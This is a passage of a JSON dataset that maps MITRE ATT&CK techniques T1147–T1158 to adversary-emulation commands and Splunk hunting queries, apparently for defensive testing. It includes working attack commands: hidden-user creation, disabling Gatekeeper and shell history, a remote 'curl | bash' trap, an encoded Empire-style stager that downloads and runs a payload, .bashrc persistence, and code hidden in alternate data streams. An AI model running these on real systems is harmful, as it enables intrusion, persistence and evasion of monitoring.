"```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1147/T1147.yaml", "command": "sudo dscl . -create /Users/APT UniqueID 333\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash sudo xattr -r -d com.apple.quarantine /path/to/*.app", "name": null}], "command_list": ["sudo dscl . -create /Users/APT UniqueID 333\n", "bash sudo xattr -r -d com.apple.quarantine /path/to/*.app"], "technique_id": "T1147", "parsed_datasets": [{"Atomic Red Team Test - Hidden Users": {"display_name": "Hidden Users", "atomic_tests": [{"description": "Add a hidden user on MacOS\n", "supported_platforms": ["macos"], "name": "Hidden Users", "input_arguments": {"user_name": {"default": "APT", "type": "string", "description": "username to add"}}, "executor": {"command": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n", "name": "sh"}}], "attack_technique": "T1147"}}, {"Threat Hunting Tables": {"mitre_attack": "T1147", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100196", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "high", "commandline_string": "sudo xattr -r -d com.apple.quarantine /path/to/*.app", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1148/T1148.yaml", "command": "export HISTCONTROL=ignoreboth\nls whoami\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash sudo spctl --master-disable", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "export HISTCONTROL=ignoreboth", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["export HISTCONTROL=ignoreboth\nls whoami\n", "bash sudo spctl --master-disable", "```", "export HISTCONTROL=ignoreboth", "```"], "technique_id": "T1148", "parsed_datasets": [{"Atomic Red Team Test - HISTCONTROL": {"display_name": "HISTCONTROL", "atomic_tests": [{"description": "Disables history collection in shells\n", "supported_platforms": ["linux", "macos"], "name": "Disable history collection", "input_arguments": {"evil_command": {"default": "whoami", "type": "String", "description": "Command to run after shell history collection is disabled"}}, "executor": {"command": "export HISTCONTROL=ignoreboth\nls #{evil_command}\n", "name": "sh"}}, {"description": "", "supported_platforms": ["macos", "linux"], "name": "Mac HISTCONTROL", "executor": {"steps": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n", "name": "manual"}}], "attack_technique": "T1148"}}, {"Threat Hunting Tables": {"mitre_attack": "T1148", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100197", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "high", "commandline_string": "sudo spctl --master-disable", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" export HISTCONTROL | table host, user_name, bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1150", "parsed_datasets": [{"Atomic Red Team Test - Plist Modification": {"display_name": "Plist Modification", "atomic_tests": [{"description": "Modify MacOS plist file in one of two directories\n", "supported_platforms": ["macos"], "name": "Plist Modification", "executor": {"steps": "1. Modify a .plist in\n\n    /Library/Preferences\n\n    OR\n\n    ~/Library/Preferences\n\n2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)\n", "name": "manual"}}], "attack_technique": "T1150"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1151", "parsed_datasets": [{"Atomic Red Team Test - Space After Filename": {"display_name": "Space After Filename", "atomic_tests": [{"description": "Space After Filename\n", "supported_platforms": ["macos"], "name": "Space After Filename", "executor": {"steps": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n", "name": "manual"}}], "attack_technique": "T1151"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1152/T1152.yaml", "command": "launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n", "name": null}], "command_list": ["launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n"], "technique_id": "T1152", "parsed_datasets": [{"Atomic Red Team Test - Launchctl": {"display_name": "Launchctl", "atomic_tests": [{"description": "Utilize launchctl\n", "supported_platforms": ["macos"], "name": "Launchctl", "executor": {"command": "launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator\n", "name": "sh"}}], "attack_technique": "T1152"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1153/T1153.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n", "name": null}, {"source": "atomics/T1153/T1153.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n", "name": null}], "command_list": ["sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n", "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n"], "technique_id": "T1153", "parsed_datasets": [{"Atomic Red Team Test - Source": {"display_name": "Source", "atomic_tests": [{"description": "Creates a script and executes it using the source command\n", "supported_platforms": ["macos", "linux"], "name": "Execute Script using Source", "executor": {"command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsource /tmp/art.sh\n", "name": "sh"}}, {"description": "Creates a script and executes it using the source command's dot alias\n", "supported_platforms": ["macos", "linux"], "name": "Execute Script using Source Alias", "executor": {"command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nchmod +x /tmp/art.sh\n. /tmp/art.sh\n", "name": "sh"}}], "attack_technique": "T1153"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1154/T1154.yaml", "command": "trap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "nohup is used for continuing program/script execution even after exit.", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT", "name": null}], "command_list": ["trap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n", "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT", "nohup is used for continuing program/script execution even after exit.", "trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT"], "technique_id": "T1154", "parsed_datasets": [{"Atomic Red Team Test - Trap": {"display_name": "Trap", "atomic_tests": [{"description": "After exiting the shell, the script will download and execute.\n\nAfter sending a keyboard interrupt (CTRL+C) the script will download and execute.\n", "supported_platforms": ["macos", "linux"], "name": "Trap", "executor": {"command": "trap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" EXIT\nexit\ntrap \"nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash\" SIGINt\n", "name": "sh"}}], "attack_technique": "T1154"}}], "queries": [{"query": "index=linux sourcetype=bash_history \"trap *\" | table host,user_name,bash_command", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1155/T1155.yaml", "command": "osascript \"do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\" | python &\"\"\n", "name": null}, {"source": "data/abilities/execution/de52784d-4de6-4d4e-b79e-e7b68fe037fb.yml", "command": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payload": "bookmark.scpt"}}}, "name": "Add a malicous bookmark which looks like a current one"}, {"source": "Threat Hunting Tables", "command": "osascript do shell script echo \\\"import ", "name": null}, {"source": "Threat Hunting Tables", "command": "osascript -e 'tell app \"System Preferences\" to activate'", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/mail", "name": "Empire Module Command"}], "command_list": ["osascript \"do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\" | python &\"\"\n", {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payload": "bookmark.scpt"}}}, "osascript do shell script echo \\\"import ", "osascript -e 'tell app \"System Preferences\" to activate'", "python/persistence/osx/mail", "python/persistence/osx/mail"], "technique_id": "T1155", "parsed_datasets": [{"Atomic Red Team Test - AppleScript": {"display_name": "AppleScript", "atomic_tests": [{"description": "Shell Script with AppleScript\n\nreference\n\nhttps://github.com/EmpireProject/Empire\n", "supported_platforms": ["macos"], "name": "AppleScript", "executor": {"command": "osascript \"do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\\\" | python &\"\"\n", "name": "sh"}}], "attack_technique": "T1155"}}, {"Mitre Stockpile - Add a malicous bookmark which looks like a current one": {"platforms": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payload": "bookmark.scpt"}}}, "description": "Add a malicous bookmark which looks like a current one", "tactic": "execution", "technique": {"attack_id": "T1155", "name": "AppleScript"}, "id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb", "name": "Add bookmark"}}, {"Threat Hunting Tables": {"mitre_attack": "T1155", "file_value": "", "file_path": "", "parent_process": "osascript", "itw_sample": "", "chain_id": "100198", "registry_value": "", "mitre_caption": "applescript", "registry_path": "", "frequency": "high", "commandline_string": "do shell script echo \\\"import ", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1155", "file_value": "", "file_path": "", "parent_process": "osascript", "itw_sample": "", "chain_id": "100199", "registry_value": "", "mitre_caption": "applescript", "registry_path": "", "frequency": "high", "commandline_string": "-e 'tell app \"System Preferences\" to activate'", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1155", "Empire Module": "python/persistence/osx/mail", "Technique": "AppleScript", "ATT&CK Technique #2": "T1108", "Concatenate for Python Dictionary": "\"python/persistence/osx/mail\":  [\"T1155\",\"T1108\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1156/T1156.yaml", "command": "echo \"/path/to/script.py\" >> ~/.bash_profile\n", "name": null}, {"source": "atomics/T1156/T1156.yaml", "command": "echo \"/path/to/script.py\" >> ~/.bashrc\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command_to_add}\" >> ~/.bashrc", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command_to_add}\" >> ~/.bash_profile", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"/home/ec2-user/welcome.sh\" >>~/.bash_profile", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"/home/ec2-user/welcome.sh\" >>~/.bashrc", "name": null}], "command_list": ["echo \"/path/to/script.py\" >> ~/.bash_profile\n", "echo \"/path/to/script.py\" >> ~/.bashrc\n", "echo \"#{command_to_add}\" >> ~/.bashrc", "echo \"#{command_to_add}\" >> ~/.bash_profile", "echo \"/home/ec2-user/welcome.sh\" >>~/.bash_profile", "echo \"/home/ec2-user/welcome.sh\" >>~/.bashrc"], "technique_id": "T1156", "parsed_datasets": [{"Atomic Red Team Test - .bash_profile and .bashrc": {"display_name": ".bash_profile and .bashrc", "atomic_tests": [{"description": "Adds a command to the .bash_profile file of the current user\n", "supported_platforms": ["macos", "linux"], "name": "Add command to .bash_profile", "input_arguments": {"command_to_add": {"default": "/path/to/script.py", "type": "string", "description": "Command to add to the .bash_profile file"}}, "executor": {"command": "echo \"#{command_to_add}\" >> ~/.bash_profile\n", "name": "sh"}}, {"description": "Adds a command to the .bashrc file of the current user\n", "supported_platforms": ["macos", "linux"], "name": "Add command to .bashrc", "input_arguments": {"command_to_add": {"default": "/path/to/script.py", "type": "string", "description": "Command to add to the .bashrc file"}}, "executor": {"command": "echo \"#{command_to_add}\" >> ~/.bashrc\n", "name": "sh"}}], "attack_technique": "T1156"}}], "queries": [{"query": "index=linux sourcetype=linux_audit bashrc_changes", "product": "Splunk", "name": null}, {"query": "-w /home/ec2-user/.bashrc -p wa -k bashrc_changes", "product": "Splunk", "name": null}, {"query": "-w /home/ec2-user/.bash_profile -p wa -k bashrc_changes", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history bash_command=\"nano .bashrc\" OR bash_command=\"vi .bashrc\" OR echo .bashrc | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history bash_command=\"nano .bashrc_profile\" OR bash_command=\"vi .bashrc_profile\" OR echo .bashrc_profile | table host,user_name,bash_command", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1158/T1158.yaml", "command": "mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo T1158 > %TEMP%\\T1158.txt\nattrib.exe +s %TEMP%\\T1158.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo T1158_hidden > %TEMP%\\T1158_hidden.txt\nattrib.exe +h %TEMP%\\T1158_hidden.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "setfile -a V /tmp/evil\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "defaults write com.apple.finder AppleShowAllFiles YES\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"Normal Text.\" > test.txt\necho cmd /c echo \"Shell code execution.\"> test.txt:#{ads_filename}\nfor /f \"usebackq delims=\" %i in (test.txt:#{ads_filename}) do %i\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"Normal Text.\" > test.txt\necho cmd /c echo \"Shell code execution.\"> test.txt:adstest.txt\nfor /f \"usebackq delims=\" %i in (test.txt:adstest.txt) do %i\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"test\" > test.txt | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path test.txt -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\nls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"test\" > test.txt | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path test.txt -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\nls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\n", "name": null}, {"source": "Threat Hunting Tables", "command": "attrib.exe +s +h * appdata", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "mkdir .hidden-directory", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "mv file to a .file", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "echo T1158 > %TEMP%\\T1158.txt\nattrib.exe +s %TEMP%\\T1158.txt\n", "echo T1158_hidden > %TEMP%\\T1158_hidden.txt\nattrib.exe +h %TEMP%\\T1158_hidden.txt\n", "setfile -a V /tmp/evil\n", "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "defaults write com.apple.finder AppleShowAllFiles YES\n", "echo \"Normal Text.\" > test.txt\necho cmd /c echo \"Shell code execution.\"> test.txt:#{ads_filename}\nfor /f \"usebackq delims=\" %i in (test.txt:#{ads_filename}) do %i\n", "echo \"Normal Text.\" > test.txt\necho cmd /c echo \"Shell code execution.\"> test.txt:adstest.txt\nfor /f \"usebackq delims=\" %i in (test.txt:adstest.txt) do %i\n", "echo \"test\" > test.txt | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path test.txt -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\nls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\n", "echo \"test\" > test.txt | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path test.txt -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\nls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\n", "attrib.exe +s +h * appdata", "```", "mkdir .hidden-directory", "```", "```", "mv file to a .file", "```"], "technique_id": "T1158", "parsed_datasets": [{"Atomic Red Team Test - Hidden Files and Directories": {"display_name": "Hidden Files and Directories", "atomic_tests": [{"description": "Creates a hidden file inside a hidden directory\n", "supported_platforms": ["linux", "macos"], "name": "Create a hidden file in a hidden directory", "executor": {"elevation_required": false, "command": "mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "name": "sh", "cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n"}}, {"description": "Hide a file on MacOS\n", "supported_platforms": ["macos"], "name": "Mac Hidden file", "executor": {"elevation_required": false, "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "name": "sh"}}, {"description": "Creates a file and marks it as a system file using the attrib.exe utility.\n", "supported_platforms": ["windows"], "name": "Create Windows System File with Attrib", "executor": {"elevation_required": true, "command": "echo T1158 > %TEMP%\\T1158.txt\nattrib.exe +s %TEMP%\\T1158.txt\n", "name": "command_prompt", "cleanup_command": "del /A:S %TEMP%\\T1158.txt >nul 2>&1\n"}}, {"description": "Creates a file and marks it as hidden using the attrib.exe utility.\n", "supported_platforms": ["windows"], "name": "Create Windows Hidden File with Attrib", "executor": {"elevation_required": false, "command": "echo T1158_hidden > %TEMP%\\T1158_hidden.txt\nattrib.exe +h %TEMP%\\T1158_hidden.txt\n", "name": "command_prompt", "cleanup_command": "del /A:H %TEMP%\\T1158_hidden.txt >nul 2>&1\n"}}, {"description": "Requires Apple Dev Tools\n", "supported_platforms": ["macos"], "name": "Hidden files", "input_arguments": {"filename": {"default": "/tmp/evil", "type": "path", "description": "path of file to hide"}}, "executor": {"elevation_required": false, "command": "setfile -a V #{filename}\n", "name": "sh"}}, {"description": "Hide a directory on MacOS\n", "supported_platforms": ["macos"], "name": "Hide a Directory", "executor": {"elevation_required": false, "command": "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "name": "sh", "cleanup_command": "rm /var/tmp/T1158_mac.txt\n"}}, {"description": "Show all hidden files on MacOS\n", "supported_platforms": ["macos"], "name": "Show all hidden files", "executor": {"elevation_required": false, "command": "defaults write com.apple.finder AppleShowAllFiles YES\n", "name": "sh", "cleanup_command": "defaults write com.apple.finder AppleShowAllFiles NO\n"}}, {"description": "Create an Alternate Data Stream with the command prompt. Write access is required.\n", "supported_platforms": ["windows"], "name": "Create ADS command prompt", "input_arguments": {"file_name": {"default": "test.txt", "type": "string", "description": "File name of file to create ADS on."}, "ads_filename": {"default": "adstest.txt", "type": "string", "description": "Name of ADS file."}}, "executor": {"elevation_required": false, "command": "echo \"Normal Text.\" > #{file_name}\necho cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=\u03c6\" %i in (#{file_name}:#{ads_filename}) do %i\n", "name": "command_prompt", "cleanup_command": "del #{file_name} >nul 2>&1\n"}}, {"description": "Create an Alternate Data Stream with PowerShell. Write access is required.\n", "supported_platforms": ["windows"], "name": "Create ADS PowerShell", "input_arguments": {"file_name": {"default": "test.txt", "type": "string", "description": "File name of file to create ADS on."}, "ads_filename": {"default": "adstest.txt", "type": "string", "description": "Name of ADS file."}}, "executor": {"elevation_required": false, "command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream 